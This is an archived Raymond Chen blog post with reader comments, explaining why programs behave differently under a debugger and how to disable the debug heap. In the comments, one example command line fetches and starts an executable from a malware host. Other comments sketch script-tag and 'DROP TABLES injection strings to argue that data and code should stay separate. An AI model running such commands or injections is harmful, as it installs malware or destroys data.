<html>
<head>
<title>Why does my program run really slow or even crash (or stop crashing, or crash differently) if running under a debugger?</title>
<link rel="stylesheet" href="page.css">
</head><body>
<div class="titlediv"><h2>Why does my program run really slow or even crash (or stop crashing, or crash differently) if running under a debugger?</h2></div>
<div class="hdrdiv"><table class="hdrtable" cellspacing="0" cellpadding="0">
<tr><td><b>Date:</b></td><td>January 3, 2013 / year-entry #3</td></tr>
<tr><td><b>Tags:</b></td><td>code</td></tr>
<tr><td><b>Orig Link:</b></td><td>https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653</td></tr>

<tr><td><b>Comments:&nbsp;&nbsp;&nbsp;&nbsp;</b></td><td>27</td></tr>
<tr><td valign="top"><b>Summary:</b></td><td valign="top">More than once, a customer has noticed that running the exact same program under the debugger rather than standalone causes it to change behavior. And not just in the "oh, the timing of various operations changed to hit different race conditions" but in much more fundamental ways like "my program runs really slow" or "my...</td></tr>
</table></div>
<hr/>
<table class="contenttable" cellspacing="0" cellpadding="0"><tr><td><div class="contentdiv">
<!-- CONTENT START -->
<p>More than once, a customer has noticed that running the exact same program under the debugger rather than standalone causes it to change behavior. And not just in the "oh, the timing of various operations changed to hit different race conditions" but in much more fundamental ways like "my program runs really slow" or "my program crashes in a totally different location" or (even more frustrating) "<a href="http://blogs.msdn.com/b/larryosterman/archive/2008/09/03/anatomy-of-a-heisenbug.aspx">my bug goes away</a>".</p>
<p> What's going on? I'm not even switching between the retail and debug versions of my program, so I'm not a victim of <a href="http://blogs.msdn.com/b/oldnewthing/archive/2006/08/15/701130.aspx"> changing program semantics in the debug build</a>. </p>
<p> When a program is running under the debugger, some parts of the system behave differently. One example is that the <code>Close&shy;Handle</code> function raises an exception (I believe it's <code>STATUS_<wbr>INVALID_<wbr>HANDLE</wbr></wbr></code> but don't quote me) if you ask it to close a handle that isn't open. But the one that catches most people is that when run under the debugger, an alternate heap is used. This alternate heap has a different memory layout, and it does extra work when allocating and freeing memory to help try to catch common heap errors, like filling newly-allocated memory with a known sentinel value. </p>
<p> But this change in behavior can make your debugging harder or impossible. </p>
<p> So much for people's suggestions to <a href="http://blogs.msdn.com/b/oldnewthing/archive/2010/01/11/9946339.aspx"> switch to a stricter implementation of the Windows API when a debugger is attached</a>. </p>
<p> On Windows&nbsp;XP and higher, you can <a href="http://msdn.microsoft.com/library/ff538841.aspx"> disable the debug heap even when debugging</a>. If you are using a <code>dbgeng</code>-based debugger like <code>ntsd</code> or <code>WinDbg</code>, you can pass the <code>-hd</code> command line switch. If you are using Visual Studio, you can <a href="http://mackeblog.blogspot.com/2009/02/disabling-visual-studios-debugger-heap.html"> set the <code>_NO_DEBUG_HEAP</code> environment variable to <code>1</code></a>. </p>
<p> If you are debugging on a version of Windows prior to Windows&nbsp;XP, you can start the process without a debugger, then connect a debugger to the live process. The decision to use the debug heap is made at process startup, so connecting the debugger afterwards ensures that the retail heap is chosen. </p>
<!-- CONTENT END -->
</div></td></tr></table>
<hr/>
<table class="commenttable" cellspacing="0" cellpadding="0"><tr><td><div class="commentdiv"><div class="commentdivhdr">
<!-- COMMENTS START -->
Comments (27)	</div>

	
			<div class="navigation pagination clear-both">
					</div>

		<ol class="comment-list">
					<li class="comment even thread-even depth-1" id="comment-1030243">
				<div id="div-comment-1030243" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Adrian</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030243">
			January 3, 2013 at 8:15 am</a>		</div>

		<p>I never knew the debug heap stuff was tied to using a debugger. &nbsp;I assume it&#39;s impossible for the debugger to switch heaps when attaching to an already-running program. &nbsp;I also assume you&#39;re talking about the heap as in HeapAllocate and not the debug C and C++ runtime libraries that wrap memory allocation for debugging purposes.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1030283">
				<div id="div-comment-1030283" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">anyfoo</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030283">
			January 3, 2013 at 8:47 am</a>		</div>

		<p>@Adrian, it really seems very impossible for the debugger to &quot;switch heaps&quot; when attaching to an already-running program. The debug heap may very well have a completely different layout, which you can&#39;t rearrange without knowing what is pointing into it (which is practically impossible in C/C++ to find out). Not to mention that it would be a huge effort with very little gain&#8230; The same can be said for magically &quot;injecting&quot; any debugging runtime libraries into running code.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment even thread-even depth-1" id="comment-1030303">
				<div id="div-comment-1030303" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Mike</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030303">
			January 3, 2013 at 9:02 am</a>		</div>

		<p>It seems that folks who might complain about the change in behavior should remember that a debugger is just a tool to help the debugging process. &nbsp;Just because it&#39;s called a &quot;debugger&quot; doesn&#39;t mean that it&#39;s the only thing you should be using. &nbsp;If your program crashes in a different place in the debugger, then clearly, the crash location isn&#39;t really where you&#39;re going to find the problem. &nbsp;A binary search of recent code changes should help. &nbsp;A good source code control system can help tremendously here. &nbsp;Same goes for heisenbugs. &nbsp;Raymond, I think you&#39;ve posted here before about, &quot;Just because the OS tries to help you when you do something wrong, doesn&#39;t mean that it&#39;s going to be helpful in every case.&quot;</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1030323">
				<div id="div-comment-1030323" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Ivo</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030323">
			January 3, 2013 at 9:44 am</a>		</div>

		<p>I am sure the debugger doesn&#39;t change the heap as it attaches to a process. That&#39;s what I used before I discovered _NO_DEBUG_HEAP on Larry Osterman&#39;s WebLog.</p>
<p>Nitpicker corner: Of course I mean &quot;Visual Studio&#39;s debugger&quot;. There may be other debuggers that try to do something more nefarious.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment even thread-even depth-1" id="comment-1030363">
				<div id="div-comment-1030363" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Joshua</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030363">
			January 3, 2013 at 10:10 am</a>		</div>

		<p>The heisenbug you can understand is not the true heisenbug.</p>
<p>You think you&#39;ve seen trouble with &quot;Aliens ate my software.&quot; You&#39;ve seen nothing until you&#39;ve seen an unrequested DMA from the wireless card overwrite the kernel.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1030403">
				<div id="div-comment-1030403" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">j b</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030403">
			January 3, 2013 at 11:03 am</a>		</div>

		<p>People complaining about the program running slower under a debugger have no clue about how a debugger works. I am rather impressed by how <em>fast</em> programs run under the control of a debugger.</p>
<p>An story to illustrate why a bug can vanish under a debugger (this was neither under Windows nor on a PC!):</p>
<p>We early suspected a stray pointer or array size violation causing the code to crash. It crashed even under the debugger, as long as we were stepping call-by-call. This was a &quot;stone age&quot; program, from age when a 2000 line function was considered OK, and we traced the problem down to a call to such a function. But wehere in those 35 pages of code? When line-by-line stepping was turned on, the program did not crash.</p>
<p>The explanation: A stray pointer had modified an instruction. What happens when you set l-b-l stepping is that the debugger inserts a sofware breakpoint in place of the first instruction on every line; the original instruction will be retrieved from the executable file when needed Every time a line is to be executed, BP transfers control to the debugger, which replaces the breakpoint with the original instruction, and reinserts original instruction from the exeucable file, decrements the program counter so that the original instruction will be executed, steps one single instruction, and re-inserts the BP before continuing withe rest of the instructions for that line.</p>
<p>The stray pointer hit the first instruction on a line, overwriting it with some garbage &#39;instruction code&#39;, crashing the program some time later when that instruction was executed. With the debugger in l-b-l-stepping, the debugger had placed a BP there, so it was the BP being destoryed. Before executing the destroyed instruction, the debugger fetched the original instruction, overwriting the (garbled) BP with the pure, virgin instruction, which was executed, before a BP again was inserted and no trace was left of the damage.</p>
<p>(There were some unfortunate circumstances, such as the location being destoyed before the debugger inserted its BP &#8211; if the BP had been in place from the very start, the debugger wouldn&#39;t have been activated at that point to reinisert the original instruction. Indeed: If our first command to the debugger was to go into l-b-l stepping for the entire program, it would crash; we verified that after having found the explanation. But the size of the program made it unrealistic to do that in ordinary debugging; you would set l-b-l stepping on selected functions when needed, not all the time and not for the entire program.)</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment even thread-even depth-1" id="comment-1030413">
				<div id="div-comment-1030413" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Gabe</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030413">
			January 3, 2013 at 11:08 am</a>		</div>

		<p>The first thing I thought of when I saw &quot;run really slow if being debugged&quot; was that the program has too many calls to OutputDebugString. The second thing was that it&#39;s throwing too many exceptions (which were being ignored). I was pleasantly surprised to see a third item I hadn&#39;t anticipated.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1030453">
				<div id="div-comment-1030453" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Jeroen Mostert</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030453">
			January 3, 2013 at 11:34 am</a>		</div>

		<p>@jb: thank heavens for modern architectures with hardware breakpoints, so debuggers can do this sort of thing without modifying code. And memory protection, of course, so code can&#39;t modify itself in the first place &#8212; but that&#39;s another kettle of fish.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment even thread-even depth-1" id="comment-1030493">
				<div id="div-comment-1030493" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Csaboka</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030493">
			January 3, 2013 at 11:54 am</a>		</div>

		<p>@Jeroen:</p>
<p>Last time I checked, x86 still had support for 4 hardware breakpoints only. I don&#39;t think you can get far without using the good old INT3 instruction for your breakpoints.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1030503">
				<div id="div-comment-1030503" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">CPDaniel</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030503">
			January 3, 2013 at 11:54 am</a>		</div>

		<p>@jb: &nbsp;Ah yes, the good old days. &nbsp;I remember tracking down bugs like that in embedded code nearly 30 years ago. &nbsp;Fun times.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment even thread-even depth-1" id="comment-1030533">
				<div id="div-comment-1030533" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Killer{R}</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030533">
			January 3, 2013 at 12:23 pm</a>		</div>

		<p>I use another trick if want to prevent heap or some other logic changes when debugging: find out a PEB&#39;s address using !peb command in windbg, then set its BeingDebugged field to zero using eb command ad go. There&#39;re still other ways to detect debugger (and other ways to fake them), but this usually helps.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1030553">
				<div id="div-comment-1030553" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">j b</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030553">
			January 3, 2013 at 1:01 pm</a>		</div>

		<p>@Jeroen:</p>
<p>I am currently developing SW for an embedded ARM M0, which is like Csaboka says: 4 HW breakpoints &#8211; simply because you cannot easily set SW breakpoints in Flash code memory (even less in one-time-programmable code memory). That doesn&#39;t get you very far. We do a lot of debugging on a simulator (running on a PC), where we <em>can</em> set an arbitrary number of SW BPs.</p>
<p>Obviously, memory protection makes wonders to debugging. But with several interpreted languages, &quot;code&quot; is restricted to an interpreter of a data structure residing in data space, and those HW protection mechanisms rarely support multiple data segments with individual protection. Besides, for some languages inviting you to write self-modifying code at one level or the other, you just <em>cannot</em> protect the data space representing this code. (Yes, I know that most programmers frown upon self-modifying code &#8230;yet they miight maintain e.g. a list or maybe a tree of pending operations, never realizing that the list really is a &#39;program&#39;, although at a very high level, that is modified all the time!)</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment even thread-even depth-1" id="comment-1030563">
				<div id="div-comment-1030563" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Joe</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030563">
			January 3, 2013 at 1:20 pm</a>		</div>

		<p>@jb: &quot;Yes, I know that most programmers frown upon self-modifying code&quot;.</p>
<p>Sadly not so. That&#39;s why SQL injections are such an insidious and ubiquitous security hole on the Internet.</p>
<p>Mixing Data and Code was the worst decision from a security and stability design point of view by programmers ever, and even more tragically lots of developers don&#39;t see it.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1030573">
				<div id="div-comment-1030573" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">j b</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030573">
			January 3, 2013 at 2:12 pm</a>		</div>

		<p>@Joe: &quot;That&#39;s why SQL injections are such an insidious and ubiquitous security hole on the Internet.&quot;</p>
<p>Common programmer: &quot;But that&#39;s not CODE! I am not modifying code, I am just building an SQL command string dynamically!&quot;</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment even thread-even depth-1" id="comment-1030583">
				<div id="div-comment-1030583" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Jeroen Mostert</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030583">
			January 3, 2013 at 2:27 pm</a>		</div>

		<p>@Csaboka: obviously you can&#39;t use HW breakpoints for everything, but I&#39;d imagine line-by-line stepping could be done by moving ahead a single HW breakpoint, which would at least eliminate this particular kind of pernicious bug. Disclaimer: I have no idea if debuggers actually do it this way.</p>
<p>@jb: I for one don&#39;t frown upon self-modifying code as a principle, I&#39;ve written plenty myself back in the day. Of course, that day was well before those of pipelining architectures, where self-modifying code is not so hot for performance anymore. As a general approach, though, treating data as code (and vice versa) leads to marvels of flexibility, but is best approached with the level of humility appropriate to our limited capacity for understanding it (well, mine, at least).</p>
<div class="post">[<em>Moving a single breakpoint means that the debugger would have to know ahead of time which branches are taken. (Which is the instruction &quot;after&quot; an <code>if</code> statement?) It&#39;s easier just to set breakpoints everywhere. -Raymond</em>]</div>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1030593">
				<div id="div-comment-1030593" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Killer{R}</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030593">
			January 3, 2013 at 2:41 pm</a>		</div>

		<p>Separating data and code isnt absolute fix against buffer overrun&amp;co. Corrupting data only is not more secure than corrupting code in any real-world-complex-app. For example attacker can find in memory string with command line of some child app that will be executed later and write there wget <a href="http://www.malware.com/paloader.exe" rel="nofollow">http://www.malware.com/paloader.exe</a> &amp; start payloader.exe or do something else. Of course this will add some obstacles for attackers ad increase generic &quot;price of attack&quot;, but you will pay wih flexibility of platform for this, thus, increasing generic &quot;price of app developing&quot;. The only question what price will be higher here.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment even thread-even depth-1" id="comment-1030603">
				<div id="div-comment-1030603" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Joe</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030603">
			January 3, 2013 at 2:45 pm</a>		</div>

		<p>@Killer{R} Overwriting data is bad. But overwriting code is worse. Overwriting data MIGHT be able to be malicious later. Overwriting code IS game over NOW.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1030623">
				<div id="div-comment-1030623" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Joshua</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030623">
			January 3, 2013 at 3:30 pm</a>		</div>

		<p>[Moving a single breakpoint means that the debugger would have to know ahead of time which branches are taken. (Which is the instruction &quot;after&quot; an if statement?) It&#39;s easier just to set breakpoints everywhere. -Raymond]</p>
<p>Still only 2 breakpoints. However, your point stands for call indirect.</p>
<div class="post">[<em>If the code is optimized, you may need more than 2. (And you&#39;d need a third in case a child function calls back re-entrantly into the original function.) Even with no optimizations, a <code>switch</code> would require a lot of breakpoints. -Raymond</em>]</div>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment even thread-even depth-1" id="comment-1030683">
				<div id="div-comment-1030683" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Miff</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030683">
			January 3, 2013 at 5:38 pm</a>		</div>

		<p>Wait why is the debug heap a good idea? Wouldn&#39;t you want to catch uninitialized memory during debugging? Switching to a more lenient version of the API seems like an even worse option then a stricter version.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1030693">
				<div id="div-comment-1030693" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">caf</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030693">
			January 3, 2013 at 5:42 pm</a>		</div>

		<p>@Csaboka, @Jeroen: The 8086 line has always had the TF (Trap Flag), which if set, causes the processor to execute a single instruction and then call int 0x01. &nbsp;This is intended to be used for single-stepping.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment even thread-even depth-1" id="comment-1030733">
				<div id="div-comment-1030733" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Csaboka</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030733">
			January 3, 2013 at 11:06 pm</a>		</div>

		<p>@caf:</p>
<p>Yes, but that&#39;s for single-stepping at the assembly level. If you want to step by lines of a high-level language program, calling back to the debugger for each machine instruction would be a waste of time, when the debugger can just replace the first instruction of each high-level line with an INT3 and be done with it.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1030743">
				<div id="div-comment-1030743" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Killer{R}</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030743">
			January 3, 2013 at 11:30 pm</a>		</div>

		<p>2Joe If <em>attacker</em> overwrites anything &#8211; he likely known what he does &#8211; and he does attack, and if attack was executed &#8211; game is over just after this fact, dont reassure yourself with illusions.</p>
<p>And if overwriting code was due to just a random bug in application, not caused by attacker&#39;s action &#8211; its not a problem that you will crash soon. Its even an opportunity.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment even thread-even depth-1" id="comment-1030753">
				<div id="div-comment-1030753" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">JU</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030753">
			January 4, 2013 at 12:39 am</a>		</div>

		<p>@Csaboka</p>
<p>We&#39;re doing embedded debuggers, and a single HW BP is sometimes all you&#39;ve got. The trick is to analyze the instructions after the PC, set the BP on any change of flow instruction, single step it and repeat this sequence until you reach a source line beginning.</p>
<p>There is some ping-pong going on sure, but it&#39;s usually in the 100 millisecond order and isn&#39;t perceived by the user.</p>
<p>Debugging a PC application this way would be much faster still, as you don&#39;t need to go through the USB to your debugger and JTAG port to the CPU, but VS just takes the easy way out here. Just like in not-showing you locals stored in registers with optimization enabled.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1030813">
				<div id="div-comment-1030813" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Neil</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030813">
			January 4, 2013 at 2:38 am</a>		</div>

		<p>I prefer WinDbg&#39;s interpretation of &quot;next&quot; over gdb&#39;s; as I recall, if you &quot;next&quot; at the end of a function, gdb steps to the next source line of the caller, while WinDbg steps to the same source line if possible (e.g. if there&#39;s a further function call to invoke). (Sadly Step Into Specific doesn&#39;t work with virtual functions.)</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment even thread-even depth-1" id="comment-1030823">
				<div id="div-comment-1030823" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Joe</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030823">
			January 4, 2013 at 3:12 am</a>		</div>

		<p>@Killer{R}.</p>
<p>If an attacker gets to change your document title via foo.php?title=&lt;script&gt;example outputs &lt;h1&gt;&lt;script&gt;example&lt;/h1&gt; there is a potential for embarrassment, but it&#39;s not the end of the world.</p>
<p>If an attacker gets to change your document&#39;s CODE via foo.php?title=&lt;script&gt;example outputs &lt;h1&gt;&lt;script&gt;example&lt;/h1&gt; there is a potential for serious harm.</p>
<p>If an attacker gets to change your page title via submit.php?title=&#39;DROP TABLES&#8211; changes the page title to &quot;&#39;DROP TABLES&#8211;&quot; you get potential embarrassment. If he gets to EXECUTE &quot;drop tables&quot; in your SQL database, he gets the ability to do real harm to you and your customers.</p>
<p>Data != Code. Attackers nearly always have some control over the data in your application. If you provide an equivilency between code and data (e.g. HTML is a string &#8211; wait &#8211; now it&#39;s javascript, or SQL is a string &#8211; wait &#8211; now it&#39;s SQL code! Or reflection via eval or filesystems being used for uploads as well as serving scripts) then suddenly you need to be careful about turning attacker provided data into attacker provided code &#8211; since attacker provided code is game over.</p>
<p>If there is never an equivilency between data and code, the worst you can have is logic bugs such as authentication bypasses or failure to apply encryption.</p>
<p>Data != Code isn&#39;t a total win for security, but it would be 95% of the journey.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1030833">
				<div id="div-comment-1030833" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Joe</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030833">
			January 4, 2013 at 3:15 am</a>		</div>

		<p>Ok. Looks like in the first example the blog engine helpfully changed AMP-GT/LTs into &lt; &gt;s, thus kind of obscuring the point I was trying to make.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment byuser comment-author-alegrigoriev even thread-even depth-1" id="comment-1030853">
				<div id="div-comment-1030853" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn"><a href='https://social.msdn.microsoft.com/profile/alegr1' rel='external nofollow' class='url'>alegr1</a></cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20130103-00/?p=5653#comment-1030853">
			January 4, 2013 at 7:35 am</a>		</div>

		<p>Worst case of a debugger interference is when a breakpoint gets set by the debugger not by a line number, but by an absolute offset from a symbol (function name). As the code gets modified and recompiled, the location is now in the middle of an instruction, and the instruction gets corrupted by a stray CC. Fun.</p>

		
				</div>
		</li><!-- #comment-## -->
		</ol><!-- .comment-list -->

		<div class="navigation pagination">
					</div>

	
			<p class="no-comments">Comments are closed.</p>
<!-- COMMENTS END -->
</div></td></tr></table>

</body>
</html>
<br/><div class="disclaimer">
*DISCLAIMER: I DO NOT OWN THIS CONTENT. If you are the owner and would like it removed, please
<a target="_blank" href="/contact.htm">contact me</a>.
The content herein is an archived reproduction of entries from
Raymond Chen's "Old New Thing" Blog (most recent link is <a target="_blank" href="https://devblogs.microsoft.com/oldnewthing/">here</a>).
It may have slight formatting modifications for consistency and to improve readability.
<br/><br/>
WHY DID I DUPLICATE THIS CONTENT HERE?
Let me first say this site has never had anything to sell and has never shown ads of any kind. I have nothing monetarily to gain by duplicating content here.
Because I had made my own local copy of this content throughout the years, for ease of using tools like grep, I decided to put it online after I discovered
some of the original content previously and publicly available, had disappeared approximately early to mid 2019.
At the same time, I present the content in an easily accessible theme-agnostic way.
<br/><br/>
The information provided by Raymond's blog is, for all practical purposes, more authoritative on Windows Development than Microsoft's
own MSDN documentation and should be considered supplemental reading to that documentation. The wealth of missing details
provided by this blog that Microsoft could not or did not document about Windows over the years is vital enough, many would agree an online "backup" of these details
is a necessary endeavor. Specifics include:<br/>
<ul>
    <li>
        A "redesign" after 2019 erased thousands of user's comments from previous years. As many have stated, the comments are nearly as important as the postings themselves.
        The archived copies of the postings contained here retain the original comments.
    </li>
    <li>
        The blog has changed domains many times and the urls have otherwise been under constant change since 2003.
        Even when proper redirection has been set up for those links, redirection only works for a limited period of time.
        For example, all of the internal blog links that were valid in early 2019, were broken by 2020 without proper redirection.
    </li>
    <li>
        The blog has been under constant re-design and re-theming since its inception.
        It is downright irritating to deal with a bogged-down site experience as the result of the latest visual themes designed for cell-phone browsers.
        As of this writing, it is cumbersome to navigate titles with only 10 entries per page.
        While it is nice that the official site has a search feature, searching using this index (with all titles on a single page) is much quicker (CTRL-F in most browsers).
    </li>
</ul>
</div><br/>
&lt;-- Back to <a href="index.htm">Old New Thing Archive Index</a>

